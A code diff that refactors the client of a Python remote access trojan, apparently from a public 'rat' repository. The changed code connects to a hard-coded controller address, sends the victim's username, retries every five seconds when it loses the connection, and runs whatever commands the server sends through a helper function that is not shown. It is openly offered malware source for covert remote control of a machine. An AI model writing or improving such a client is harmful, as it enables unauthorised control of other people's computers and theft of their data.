@@ -6,10 +6,6 @@ Made by Lukas Alstrup
 github.com/LukasAlstrup/rat
 
 """
-
-debug = True
-#TODO configure debug mode
-
 import os
 import socket
 import pyautogui
@@ -24,36 +20,44 @@ from functions import *
 import signal
 import struct
 
-
-
-#Server
 port = 8080
 host = "192.168.0.14"
 
-s = socket.socket()
 print("[+] Server: ", host, " Port: ", port)
 
-#Connect to the server
-while True:
-    try:
-        s.connect((host, port))
-        break
-    except ConnectionRefusedError:
-        print("[-] The server refused to conect. A fireall may be blocking the port")
-    except TimeoutError:
-        print("[-] No response from the server")
-    except Exception as e:
-        print("[-] Error while connecting to the server: ", e)
 
+def connect():
+    s = socket.socket()
+    while True:
+        print("Trying to connect to the server")
+        try:
+            s.connect((host, port))
+            print("Connected to the server successfully")
+            execute_commands(s)
+        except ConnectionRefusedError:
+            print("[-] The server refused to conect. A firewall may be blocking the port")
+        except TimeoutError:
+            print("[-] No response from the server")
+        except Exception as e:
+            print("[-] Error while connecting to the server: ", e)
+        time.sleep(5)
 
-print("Connected to the server successfully")
+def execute_commands(s):
+    s.send(getpass.getuser().encode())
+    while True:
+        try:
+            command = s.recv(1024)
+            command = command.decode()
+            check_command(s,command)
+        except socket.error as socket_error:
+            print("Socket error: " + socket_error)
+            s.close()
+            s = ""
+            connect()
+        except Exception as error_msg:
+            print("Error: " + str(error_msg))
 
-s.send(getpass.getuser().encode())
+def main():
+    connect()
 
-
-while True:
-    #hi = s.recv(1024).decode()
-    #print(hi)
-    command = s.recv(1024)
-    command = command.decode()
-    check_command(s,command)
+main()
